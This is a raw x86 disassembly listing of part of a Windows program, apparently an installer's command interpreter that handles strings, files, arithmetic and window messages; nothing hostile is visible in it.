  4016d4:	85 c0                	test   %eax,%eax
  4016d6:	74 23                	je     0x4016fb
  4016d8:	8b 45 08             	mov    0x8(%ebp),%eax
  4016db:	3b c6                	cmp    %esi,%eax
  4016dd:	76 25                	jbe    0x401704
  4016df:	38 18                	cmp    %bl,(%eax)
  4016e1:	74 21                	je     0x401704
  4016e3:	56                   	push   %esi
  4016e4:	e8 84 4b 00 00       	call   0x40626d
  4016e9:	3b c3                	cmp    %ebx,%eax
  4016eb:	74 0e                	je     0x4016fb
  4016ed:	83 c0 2c             	add    $0x2c,%eax
  4016f0:	50                   	push   %eax
  4016f1:	ff 75 08             	push   0x8(%ebp)
  4016f4:	e8 71 48 00 00       	call   0x405f6a
  4016f9:	eb 09                	jmp    0x401704
  4016fb:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401702:	88 1f                	mov    %bl,(%edi)
  401704:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401707:	0f 85 4a 12 00 00    	jne    0x402957
  40170d:	68 00 04 00 00       	push   $0x400
  401712:	57                   	push   %edi
  401713:	57                   	push   %edi
  401714:	ff 15 00 71 40 00    	call   *0x407100
  40171a:	e9 38 12 00 00       	jmp    0x402957
  40171f:	6a ff                	push   $0xffffffff
  401721:	e8 a5 13 00 00       	call   0x402acb
  401726:	8d 4d 08             	lea    0x8(%ebp),%ecx
  401729:	51                   	push   %ecx
  40172a:	56                   	push   %esi
  40172b:	68 00 04 00 00       	push   $0x400
  401730:	53                   	push   %ebx
  401731:	50                   	push   %eax
  401732:	53                   	push   %ebx
  401733:	ff 15 10 71 40 00    	call   *0x407110
  401739:	85 c0                	test   %eax,%eax
  40173b:	0f 85 16 12 00 00    	jne    0x402957
  401741:	e9 aa 0f 00 00       	jmp    0x4026f0
  401746:	6a ef                	push   $0xffffffef
  401748:	e8 7e 13 00 00       	call   0x402acb
  40174d:	50                   	push   %eax
  40174e:	56                   	push   %esi
  40174f:	e8 de 43 00 00       	call   0x405b32
  401754:	e9 55 fe ff ff       	jmp    0x4015ae
  401759:	6a 31                	push   $0x31
  40175b:	e8 6b 13 00 00       	call   0x402acb
  401760:	8b f0                	mov    %eax,%esi
  401762:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401765:	83 e0 07             	and    $0x7,%eax
  401768:	56                   	push   %esi
  401769:	89 75 f8             	mov    %esi,-0x8(%ebp)
  40176c:	89 45 08             	mov    %eax,0x8(%ebp)
  40176f:	e8 fb 41 00 00       	call   0x40596f
  401774:	56                   	push   %esi
  401775:	be e8 93 40 00       	mov    $0x4093e8,%esi
  40177a:	85 c0                	test   %eax,%eax
  40177c:	74 08                	je     0x401786
  40177e:	56                   	push   %esi
  40177f:	e8 e6 47 00 00       	call   0x405f6a
  401784:	eb 17                	jmp    0x40179d
  401786:	68 00 98 42 00       	push   $0x429800
  40178b:	56                   	push   %esi
  40178c:	e8 d9 47 00 00       	call   0x405f6a
  401791:	50                   	push   %eax
  401792:	e8 6b 41 00 00       	call   0x405902
  401797:	50                   	push   %eax
  401798:	e8 e9 47 00 00       	call   0x405f86
  40179d:	56                   	push   %esi
  40179e:	e8 31 4a 00 00       	call   0x4061d4
  4017a3:	bf e8 9b 40 00       	mov    $0x409be8,%edi
  4017a8:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4017ac:	7c 31                	jl     0x4017df
  4017ae:	56                   	push   %esi
  4017af:	e8 b9 4a 00 00       	call   0x40626d
  4017b4:	33 c9                	xor    %ecx,%ecx
  4017b6:	3b c3                	cmp    %ebx,%eax
  4017b8:	74 10                	je     0x4017ca
  4017ba:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4017bd:	83 c0 14             	add    $0x14,%eax
  4017c0:	51                   	push   %ecx
  4017c1:	50                   	push   %eax
  4017c2:	ff 15 f4 70 40 00    	call   *0x4070f4
  4017c8:	8b c8                	mov    %eax,%ecx
  4017ca:	8b 45 08             	mov    0x8(%ebp),%eax
  4017cd:	83 c0 fd             	add    $0xfffffffd,%eax
  4017d0:	0d 00 00 00 80       	or     $0x80000000,%eax
  4017d5:	23 c1                	and    %ecx,%eax
  4017d7:	f7 d8                	neg    %eax
  4017d9:	1b c0                	sbb    %eax,%eax
  4017db:	40                   	inc    %eax
  4017dc:	89 45 08             	mov    %eax,0x8(%ebp)
  4017df:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4017e2:	75 06                	jne    0x4017ea
  4017e4:	56                   	push   %esi
  4017e5:	e8 f4 42 00 00       	call   0x405ade
  4017ea:	33 c0                	xor    %eax,%eax
  4017ec:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  4017f0:	0f 95 c0             	setne  %al
  4017f3:	40                   	inc    %eax
  4017f4:	50                   	push   %eax
  4017f5:	68 00 00 00 40       	push   $0x40000000
  4017fa:	56                   	push   %esi
  4017fb:	e8 03 43 00 00       	call   0x405b03
  401800:	83 f8 ff             	cmp    $0xffffffff,%eax
  401803:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401806:	75 76                	jne    0x40187e
  401808:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40180b:	75 53                	jne    0x401860
  40180d:	68 00 40 42 00       	push   $0x424000
  401812:	57                   	push   %edi
  401813:	e8 52 47 00 00       	call   0x405f6a
  401818:	56                   	push   %esi
  401819:	68 00 40 42 00       	push   $0x424000
  40181e:	e8 47 47 00 00       	call   0x405f6a
  401823:	ff 75 ec             	push   -0x14(%ebp)
  401826:	68 e8 97 40 00       	push   $0x4097e8
  40182b:	e8 5c 47 00 00       	call   0x405f8c
  401830:	57                   	push   %edi
  401831:	68 00 40 42 00       	push   $0x424000
  401836:	e8 2f 47 00 00       	call   0x405f6a
  40183b:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40183e:	c1 f8 03             	sar    $0x3,%eax
  401841:	50                   	push   %eax
  401842:	68 e8 97 40 00       	push   $0x4097e8
  401847:	e8 3a 3e 00 00       	call   0x405686
  40184c:	83 e8 04             	sub    $0x4,%eax
  40184f:	0f 84 53 ff ff ff    	je     0x4017a8
  401855:	48                   	dec    %eax
  401856:	74 1b                	je     0x401873
  401858:	56                   	push   %esi
  401859:	6a fa                	push   $0xfffffffa
  40185b:	e9 32 fc ff ff       	jmp    0x401492
  401860:	ff 75 f8             	push   -0x8(%ebp)
  401863:	6a e2                	push   $0xffffffe2
  401865:	e8 27 38 00 00       	call   0x405091
  40186a:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  40186e:	e9 3d fd ff ff       	jmp    0x4015b0
  401873:	ff 05 a8 37 42 00    	incl   0x4237a8
  401879:	e9 e2 10 00 00       	jmp    0x402960
  40187e:	ff 75 f8             	push   -0x8(%ebp)
  401881:	6a ea                	push   $0xffffffea
  401883:	e8 09 38 00 00       	call   0x405091
  401888:	ff 05 d4 37 42 00    	incl   0x4237d4
  40188e:	53                   	push   %ebx
  40188f:	53                   	push   %ebx
  401890:	ff 75 f4             	push   -0xc(%ebp)
  401893:	ff 75 e0             	push   -0x20(%ebp)
  401896:	e8 01 17 00 00       	call   0x402f9c
  40189b:	ff 0d d4 37 42 00    	decl   0x4237d4
  4018a1:	83 7d e4 ff          	cmpl   $0xffffffff,-0x1c(%ebp)
  4018a5:	8b f8                	mov    %eax,%edi
  4018a7:	75 06                	jne    0x4018af
  4018a9:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  4018ad:	74 12                	je     0x4018c1
  4018af:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4018b2:	50                   	push   %eax
  4018b3:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4018b6:	53                   	push   %ebx
  4018b7:	50                   	push   %eax
  4018b8:	ff 75 f4             	push   -0xc(%ebp)
  4018bb:	ff 15 0c 71 40 00    	call   *0x40710c
  4018c1:	ff 75 f4             	push   -0xc(%ebp)
  4018c4:	ff 15 14 71 40 00    	call   *0x407114
  4018ca:	3b fb                	cmp    %ebx,%edi
  4018cc:	0f 8d 85 10 00 00    	jge    0x402957
  4018d2:	83 ff fe             	cmp    $0xfffffffe,%edi
  4018d5:	75 13                	jne    0x4018ea
  4018d7:	6a e9                	push   $0xffffffe9
  4018d9:	56                   	push   %esi
  4018da:	e8 ad 46 00 00       	call   0x405f8c
  4018df:	ff 75 f8             	push   -0x8(%ebp)
  4018e2:	56                   	push   %esi
  4018e3:	e8 9e 46 00 00       	call   0x405f86
  4018e8:	eb 08                	jmp    0x4018f2
  4018ea:	6a ee                	push   $0xffffffee
  4018ec:	56                   	push   %esi
  4018ed:	e8 9a 46 00 00       	call   0x405f8c
  4018f2:	68 10 00 20 00       	push   $0x200010
  4018f7:	56                   	push   %esi
  4018f8:	e9 e5 09 00 00       	jmp    0x4022e2
  4018fd:	53                   	push   %ebx
  4018fe:	eb 34                	jmp    0x401934
  401900:	6a 31                	push   $0x31
  401902:	e8 c4 11 00 00       	call   0x402acb
  401907:	ff 75 d8             	push   -0x28(%ebp)
  40190a:	50                   	push   %eax
  40190b:	e8 76 3d 00 00       	call   0x405686
  401910:	3b c3                	cmp    %ebx,%eax
  401912:	0f 84 04 0e 00 00    	je     0x40271c
  401918:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  40191b:	0f 84 67 01 00 00    	je     0x401a88
  401921:	3b 45 e8             	cmp    -0x18(%ebp),%eax
  401924:	0f 85 2d 10 00 00    	jne    0x402957
  40192a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40192d:	e9 30 10 00 00       	jmp    0x402962
  401932:	6a f0                	push   $0xfffffff0
  401934:	e8 92 11 00 00       	call   0x402acb
  401939:	ff 75 dc             	push   -0x24(%ebp)
  40193c:	50                   	push   %eax
  40193d:	e8 f0 3d 00 00       	call   0x405732
  401942:	e9 10 10 00 00       	jmp    0x402957
  401947:	6a 01                	push   $0x1
  401949:	e8 7d 11 00 00       	call   0x402acb
  40194e:	50                   	push   %eax
  40194f:	e8 2c 46 00 00       	call   0x405f80
  401954:	e9 24 0c 00 00       	jmp    0x40257d
  401959:	6a 02                	push   $0x2
  40195b:	e8 49 11 00 00       	call   0x402aa9
  401960:	6a 03                	push   $0x3
  401962:	89 45 c0             	mov    %eax,-0x40(%ebp)
  401965:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401968:	e8 3c 11 00 00       	call   0x402aa9
  40196d:	59                   	pop    %ecx
  40196e:	8b f8                	mov    %eax,%edi
  401970:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401973:	59                   	pop    %ecx
  401974:	6a 01                	push   $0x1
  401976:	89 7d c8             	mov    %edi,-0x38(%ebp)
  401979:	89 55 cc             	mov    %edx,-0x34(%ebp)
  40197c:	89 45 08             	mov    %eax,0x8(%ebp)
  40197f:	e8 47 11 00 00       	call   0x402acb
  401984:	50                   	push   %eax
  401985:	89 45 d0             	mov    %eax,-0x30(%ebp)
  401988:	e8 f3 45 00 00       	call   0x405f80
  40198d:	39 5d c4             	cmp    %ebx,-0x3c(%ebp)
  401990:	88 1e                	mov    %bl,(%esi)
  401992:	75 03                	jne    0x401997
  401994:	89 45 08             	mov    %eax,0x8(%ebp)
  401997:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40199a:	0f 84 b7 0f 00 00    	je     0x402957
  4019a0:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4019a3:	3b cb                	cmp    %ebx,%ecx
  4019a5:	7d 0b                	jge    0x4019b2
  4019a7:	8d 3c 08             	lea    (%eax,%ecx,1),%edi
  4019aa:	3b fb                	cmp    %ebx,%edi
  4019ac:	0f 8c a5 0f 00 00    	jl     0x402957
  4019b2:	3b f8                	cmp    %eax,%edi
  4019b4:	7e 02                	jle    0x4019b8
  4019b6:	8b f8                	mov    %eax,%edi
  4019b8:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4019bb:	03 c7                	add    %edi,%eax
  4019bd:	50                   	push   %eax
  4019be:	56                   	push   %esi
  4019bf:	e8 a6 45 00 00       	call   0x405f6a
  4019c4:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019c7:	7d 0e                	jge    0x4019d7
  4019c9:	56                   	push   %esi
  4019ca:	e8 b1 45 00 00       	call   0x405f80
  4019cf:	01 45 08             	add    %eax,0x8(%ebp)
  4019d2:	79 03                	jns    0x4019d7
  4019d4:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4019d7:	8b 45 08             	mov    0x8(%ebp),%eax
  4019da:	3d 00 04 00 00       	cmp    $0x400,%eax
  4019df:	0f 8d 72 0f 00 00    	jge    0x402957
  4019e5:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  4019e8:	e9 6a 0f 00 00       	jmp    0x402957
  4019ed:	6a 20                	push   $0x20
  4019ef:	e8 d7 10 00 00       	call   0x402acb
  4019f4:	6a 31                	push   $0x31
  4019f6:	8b f0                	mov    %eax,%esi
  4019f8:	e8 ce 10 00 00       	call   0x402acb
  4019fd:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  401a00:	50                   	push   %eax
  401a01:	56                   	push   %esi
  401a02:	75 12                	jne    0x401a16
  401a04:	ff 15 18 71 40 00    	call   *0x407118
  401a0a:	85 c0                	test   %eax,%eax
  401a0c:	75 7a                	jne    0x401a88
  401a0e:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401a11:	e9 4c 0f 00 00       	jmp    0x402962
  401a16:	ff 15 24 71 40 00    	call   *0x407124
  401a1c:	eb ec                	jmp    0x401a0a
  401a1e:	33 ff                	xor    %edi,%edi
  401a20:	47                   	inc    %edi
  401a21:	57                   	push   %edi
  401a22:	e8 a4 10 00 00       	call   0x402acb
  401a27:	68 00 04 00 00       	push   $0x400
  401a2c:	56                   	push   %esi
  401a2d:	50                   	push   %eax
  401a2e:	89 45 08             	mov    %eax,0x8(%ebp)
  401a31:	ff 15 60 71 40 00    	call   *0x407160
  401a37:	85 c0                	test   %eax,%eax
  401a39:	74 13                	je     0x401a4e
  401a3b:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401a3e:	74 13                	je     0x401a53
  401a40:	56                   	push   %esi
  401a41:	ff 75 08             	push   0x8(%ebp)
  401a44:	ff 15 24 71 40 00    	call   *0x407124
  401a4a:	85 c0                	test   %eax,%eax
  401a4c:	75 05                	jne    0x401a53
  401a4e:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401a51:	88 1e                	mov    %bl,(%esi)
  401a53:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
  401a59:	e9 f9 0e 00 00       	jmp    0x402957
  401a5e:	8b 75 ec             	mov    -0x14(%ebp),%esi
  401a61:	53                   	push   %ebx
  401a62:	e8 42 10 00 00       	call   0x402aa9
  401a67:	6a 01                	push   $0x1
  401a69:	8b f8                	mov    %eax,%edi
  401a6b:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401a6e:	e8 36 10 00 00       	call   0x402aa9
  401a73:	59                   	pop    %ecx
  401a74:	3b f3                	cmp    %ebx,%esi
  401a76:	59                   	pop    %ecx
  401a77:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401a7a:	75 08                	jne    0x401a84
  401a7c:	3b f8                	cmp    %eax,%edi
  401a7e:	7c 08                	jl     0x401a88
  401a80:	7e 8c                	jle    0x401a0e
  401a82:	eb 12                	jmp    0x401a96
  401a84:	3b f8                	cmp    %eax,%edi
  401a86:	73 08                	jae    0x401a90
  401a88:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401a8b:	e9 d2 0e 00 00       	jmp    0x402962
  401a90:	0f 86 78 ff ff ff    	jbe    0x401a0e
  401a96:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401a99:	e9 c4 0e 00 00       	jmp    0x402962
  401a9e:	6a 01                	push   $0x1
  401aa0:	e8 04 10 00 00       	call   0x402aa9
  401aa5:	8b f8                	mov    %eax,%edi
  401aa7:	6a 02                	push   $0x2
  401aa9:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401aac:	89 7d 08             	mov    %edi,0x8(%ebp)
  401aaf:	e8 f5 0f 00 00       	call   0x402aa9
  401ab4:	59                   	pop    %ecx
  401ab5:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401ab8:	59                   	pop    %ecx
  401ab9:	8b c8                	mov    %eax,%ecx
  401abb:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401abe:	83 f8 0d             	cmp    $0xd,%eax
  401ac1:	77 73                	ja     0x401b36
  401ac3:	ff 24 85 71 2a 40 00 	jmp    *0x402a71(,%eax,4)
  401aca:	03 f9                	add    %ecx,%edi
  401acc:	eb 6b                	jmp    0x401b39
  401ace:	2b f9                	sub    %ecx,%edi
  401ad0:	eb 67                	jmp    0x401b39
  401ad2:	0f af cf             	imul   %edi,%ecx
  401ad5:	eb 17                	jmp    0x401aee
  401ad7:	3b cb                	cmp    %ebx,%ecx
  401ad9:	74 44                	je     0x401b1f
  401adb:	8b c7                	mov    %edi,%eax
  401add:	99                   	cltd
  401ade:	f7 f9                	idiv   %ecx
  401ae0:	8b f8                	mov    %eax,%edi
  401ae2:	eb 55                	jmp    0x401b39
  401ae4:	0b cf                	or     %edi,%ecx
  401ae6:	eb 06                	jmp    0x401aee
  401ae8:	23 cf                	and    %edi,%ecx
  401aea:	eb 02                	jmp    0x401aee
  401aec:	33 cf                	xor    %edi,%ecx
  401aee:	8b f9                	mov    %ecx,%edi
  401af0:	eb 47                	jmp    0x401b39
  401af2:	33 c0                	xor    %eax,%eax
  401af4:	3b fb                	cmp    %ebx,%edi
  401af6:	0f 94 c0             	sete   %al
  401af9:	eb e5                	jmp    0x401ae0
  401afb:	3b fb                	cmp    %ebx,%edi
  401afd:	75 0e                	jne    0x401b0d
  401aff:	eb 08                	jmp    0x401b09
  401b01:	33 ff                	xor    %edi,%edi
  401b03:	eb 34                	jmp    0x401b39
  401b05:	3b fb                	cmp    %ebx,%edi
  401b07:	74 f8                	je     0x401b01
  401b09:	3b cb                	cmp    %ebx,%ecx
  401b0b:	74 f4                	je     0x401b01
  401b0d:	33 ff                	xor    %edi,%edi
  401b0f:	47                   	inc    %edi
  401b10:	eb 27                	jmp    0x401b39
  401b12:	3b cb                	cmp    %ebx,%ecx
  401b14:	74 09                	je     0x401b1f
  401b16:	8b c7                	mov    %edi,%eax
  401b18:	99                   	cltd
  401b19:	f7 f9                	idiv   %ecx
  401b1b:	8b fa                	mov    %edx,%edi
  401b1d:	eb 1a                	jmp    0x401b39
  401b1f:	33 ff                	xor    %edi,%edi
  401b21:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401b28:	eb 0f                	jmp    0x401b39
  401b2a:	d3 e7                	shl    %cl,%edi
  401b2c:	eb 0b                	jmp    0x401b39
  401b2e:	d3 ff                	sar    %cl,%edi
  401b30:	eb 07                	jmp    0x401b39
  401b32:	d3 ef                	shr    %cl,%edi
  401b34:	eb 03                	jmp    0x401b39
  401b36:	8b 7d 08             	mov    0x8(%ebp),%edi
  401b39:	57                   	push   %edi
  401b3a:	e9 2a fa ff ff       	jmp    0x401569
  401b3f:	6a 01                	push   $0x1
  401b41:	e8 85 0f 00 00       	call   0x402acb
  401b46:	6a 02                	push   $0x2
  401b48:	8b f8                	mov    %eax,%edi
  401b4a:	e8 5a 0f 00 00       	call   0x402aa9
  401b4f:	50                   	push   %eax
  401b50:	57                   	push   %edi
  401b51:	56                   	push   %esi
  401b52:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401b55:	ff 15 74 72 40 00    	call   *0x407274
  401b5b:	83 c4 10             	add    $0x10,%esp
  401b5e:	e9 f4 0d 00 00       	jmp    0x402957
  401b63:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401b66:	8b 3d 28 a8 40 00    	mov    0x40a828,%edi
  401b6c:	3b c3                	cmp    %ebx,%eax
  401b6e:	74 44                	je     0x401bb4
  401b70:	48                   	dec    %eax
  401b71:	3b fb                	cmp    %ebx,%edi
  401b73:	0f 84 5b 07 00 00    	je     0x4022d4
  401b79:	8b 3f                	mov    (%edi),%edi
  401b7b:	3b c3                	cmp    %ebx,%eax
  401b7d:	75 f1                	jne    0x401b70
  401b7f:	3b fb                	cmp    %ebx,%edi
  401b81:	0f 84 4d 07 00 00    	je     0x4022d4
  401b87:	83 c7 04             	add    $0x4,%edi
  401b8a:	be e8 93 40 00       	mov    $0x4093e8,%esi
  401b8f:	57                   	push   %edi
  401b90:	56                   	push   %esi
  401b91:	e8 d4 43 00 00       	call   0x405f6a
  401b96:	a1 28 a8 40 00       	mov    0x40a828,%eax
  401b9b:	83 c0 04             	add    $0x4,%eax
  401b9e:	50                   	push   %eax
  401b9f:	57                   	push   %edi
  401ba0:	e8 c5 43 00 00       	call   0x405f6a
  401ba5:	a1 28 a8 40 00       	mov    0x40a828,%eax
  401baa:	56                   	push   %esi
  401bab:	83 c0 04             	add    $0x4,%eax
  401bae:	50                   	push   %eax
  401baf:	e9 c1 0c 00 00       	jmp    0x402875
  401bb4:	3b d3                	cmp    %ebx,%edx
  401bb6:	74 25                	je     0x401bdd
  401bb8:	3b fb                	cmp    %ebx,%edi
  401bba:	0f 84 5c 0b 00 00    	je     0x40271c
  401bc0:	8d 47 04             	lea    0x4(%edi),%eax
  401bc3:	50                   	push   %eax
  401bc4:	56                   	push   %esi
  401bc5:	e8 a0 43 00 00       	call   0x405f6a
  401bca:	8b 07                	mov    (%edi),%eax
  401bcc:	57                   	push   %edi
  401bcd:	a3 28 a8 40 00       	mov    %eax,0x40a828
  401bd2:	ff 15 5c 71 40 00    	call   *0x40715c
  401bd8:	e9 7a 0d 00 00       	jmp    0x402957
  401bdd:	68 04 04 00 00       	push   $0x404
  401be2:	6a 40                	push   $0x40
  401be4:	ff 15 58 71 40 00    	call   *0x407158
  401bea:	ff 75 d8             	push   -0x28(%ebp)
  401bed:	8b f0                	mov    %eax,%esi
  401bef:	8d 46 04             	lea    0x4(%esi),%eax
  401bf2:	50                   	push   %eax
  401bf3:	e8 94 43 00 00       	call   0x405f8c
  401bf8:	a1 28 a8 40 00       	mov    0x40a828,%eax
  401bfd:	89 06                	mov    %eax,(%esi)
  401bff:	89 35 28 a8 40 00    	mov    %esi,0x40a828
  401c05:	e9 4d 0d 00 00       	jmp    0x402957
  401c0a:	6a 03                	push   $0x3
  401c0c:	e8 98 0e 00 00       	call   0x402aa9
  401c11:	6a 04                	push   $0x4
  401c13:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401c16:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c19:	e8 8b 0e 00 00       	call   0x402aa9
  401c1e:	f6 45 ec 01          	testb  $0x1,-0x14(%ebp)
  401c22:	59                   	pop    %ecx
  401c23:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401c26:	59                   	pop    %ecx
  401c27:	89 45 08             	mov    %eax,0x8(%ebp)
  401c2a:	74 0a                	je     0x401c36
  401c2c:	6a 33                	push   $0x33
  401c2e:	e8 98 0e 00 00       	call   0x402acb
  401c33:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c36:	f6 45 ec 02          	testb  $0x2,-0x14(%ebp)
  401c3a:	74 0a                	je     0x401c46
  401c3c:	6a 44                	push   $0x44
  401c3e:	e8 88 0e 00 00       	call   0x402acb
  401c43:	89 45 08             	mov    %eax,0x8(%ebp)
  401c46:	83 7d d4 21          	cmpl   $0x21,-0x2c(%ebp)
  401c4a:	6a 01                	push   $0x1
  401c4c:	75 4c                	jne    0x401c9a
  401c4e:	e8 56 0e 00 00       	call   0x402aa9
  401c53:	6a 02                	push   $0x2
  401c55:	8b f8                	mov    %eax,%edi
  401c57:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401c5a:	e8 4a 0e 00 00       	call   0x402aa9
  401c5f:	59                   	pop    %ecx
  401c60:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401c63:	59                   	pop    %ecx
  401c64:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401c67:	c1 f9 02             	sar    $0x2,%ecx
  401c6a:	74 1e                	je     0x401c8a
  401c6c:	8d 55 f4             	lea    -0xc(%ebp),%edx
  401c6f:	52                   	push   %edx
  401c70:	51                   	push   %ecx
  401c71:	53                   	push   %ebx
  401c72:	ff 75 08             	push   0x8(%ebp)
  401c75:	ff 75 f8             	push   -0x8(%ebp)
  401c78:	50                   	push   %eax
  401c79:	57                   	push   %edi
  401c7a:	ff 15 58 72 40 00    	call   *0x407258
  401c80:	f7 d8                	neg    %eax
  401c82:	1b c0                	sbb    %eax,%eax
  401c84:	40                   	inc    %eax
  401c85:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c88:	eb 3f                	jmp    0x401cc9
  401c8a:	ff 75 08             	push   0x8(%ebp)
  401c8d:	ff 75 f8             	push   -0x8(%ebp)
  401c90:	50                   	push   %eax
  401c91:	57                   	push   %edi
  401c92:	ff 15 00 72 40 00    	call   *0x407200
  401c98:	eb 2c                	jmp    0x401cc6
  401c9a:	e8 2c 0e 00 00       	call   0x402acb
  401c9f:	6a 12                	push   $0x12
  401ca1:	8b f8                	mov    %eax,%edi
  401ca3:	e8 23 0e 00 00       	call   0x402acb
  401ca8:	8a 08                	mov    (%eax),%cl
  401caa:	f6 d9                	neg    %cl
  401cac:	1b c9                	sbb    %ecx,%ecx
  401cae:	23 c8                	and    %eax,%ecx
  401cb0:	8a 07                	mov    (%edi),%al
  401cb2:	f6 d8                	neg    %al
  401cb4:	1b c0                	sbb    %eax,%eax
  401cb6:	51                   	push   %ecx
  401cb7:	23 c7                	and    %edi,%eax
  401cb9:	50                   	push   %eax
  401cba:	ff 75 08             	push   0x8(%ebp)
  401cbd:	ff 75 f8             	push   -0x8(%ebp)
  401cc0:	ff 15 5c 72 40 00    	call   *0x40725c
  401cc6:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401cc9:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401ccc:	0f 8c 85 0c 00 00    	jl     0x402957
  401cd2:	ff 75 f4             	push   -0xc(%ebp)
  401cd5:	e9 8f f8 ff ff       	jmp    0x401569
  401cda:	53                   	push   %ebx
  401cdb:	e8 c9 0d 00 00       	call   0x402aa9
  401ce0:	59                   	pop    %ecx
  401ce1:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401ce4:	50                   	push   %eax
  401ce5:	ff 15 54 72 40 00    	call   *0x407254
  401ceb:	85 c0                	test   %eax,%eax
  401ced:	0f 84 1b fd ff ff    	je     0x401a0e
  401cf3:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401cf6:	e9 67 0c 00 00       	jmp    0x402962
  401cfb:	6a 02                	push   $0x2
  401cfd:	e8 a7 0d 00 00       	call   0x402aa9
  401d02:	6a 01                	push   $0x1
  401d04:	8b f8                	mov    %eax,%edi
  401d06:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401d09:	e8 9b 0d 00 00       	call   0x402aa9
  401d0e:	59                   	pop    %ecx
  401d0f:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401d12:	59                   	pop    %ecx
  401d13:	57                   	push   %edi
  401d14:	50                   	push   %eax
  401d15:	ff 15 44 72 40 00    	call   *0x407244
  401d1b:	e9 5d 08 00 00       	jmp    0x40257d
  401d20:	a1 68 37 42 00       	mov    0x423768,%eax
  401d25:	53                   	push   %ebx
  401d26:	8d 34 10             	lea    (%eax,%edx,1),%esi
  401d29:	e8 7b 0d 00 00       	call   0x402aa9
  401d2e:	59                   	pop    %ecx
  401d2f:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401d32:	56                   	push   %esi
  401d33:	6a eb                	push   $0xffffffeb
  401d35:	50                   	push   %eax
  401d36:	ff 15 48 72 40 00    	call   *0x407248
  401d3c:	e9 16 0c 00 00       	jmp    0x402957
  401d41:	52                   	push   %edx
  401d42:	ff 75 f8             	push   -0x8(%ebp)
  401d45:	ff 15 44 72 40 00    	call   *0x407244
  401d4b:	8b f0                	mov    %eax,%esi
  401d4d:	8d 45 b8             	lea    -0x48(%ebp),%eax
  401d50:	50                   	push   %eax
  401d51:	56                   	push   %esi
  401d52:	ff 15 0c 72 40 00    	call   *0x40720c
  401d58:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  401d5b:	6a 10                	push   $0x10
  401d5d:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  401d61:	50                   	push   %eax
  401d62:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401d65:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  401d69:	50                   	push   %eax
  401d6a:	53                   	push   %ebx
  401d6b:	53                   	push   %ebx
  401d6c:	e8 5a 0d 00 00       	call   0x402acb
  401d71:	50                   	push   %eax
  401d72:	53                   	push   %ebx
  401d73:	ff 15 50 72 40 00    	call   *0x407250
  401d79:	50                   	push   %eax
  401d7a:	53                   	push   %ebx
  401d7b:	68 72 01 00 00       	push   $0x172
  401d80:	56                   	push   %esi
  401d81:	ff 15 00 72 40 00    	call   *0x407200
  401d87:	3b c3                	cmp    %ebx,%eax
  401d89:	0f 84 c8 0b 00 00    	je     0x402957
  401d8f:	50                   	push   %eax
  401d90:	ff 15 5c 70 40 00    	call   *0x40705c
  401d96:	e9 bc 0b 00 00       	jmp    0x402957
  401d9b:	ff 75 f8             	push   -0x8(%ebp)
  401d9e:	ff 15 38 72 40 00    	call   *0x407238
  401da4:	6a 02                	push   $0x2
  401da6:	8b f8                	mov    %eax,%edi
  401da8:	e8 fc 0c 00 00       	call   0x402aa9
  401dad:	59                   	pop    %ecx
  401dae:	8b d8                	mov    %eax,%ebx
  401db0:	6a 48                	push   $0x48
  401db2:	6a 5a                	push   $0x5a
  401db4:	57                   	push   %edi
  401db5:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401db8:	ff 15 60 70 40 00    	call   *0x407060
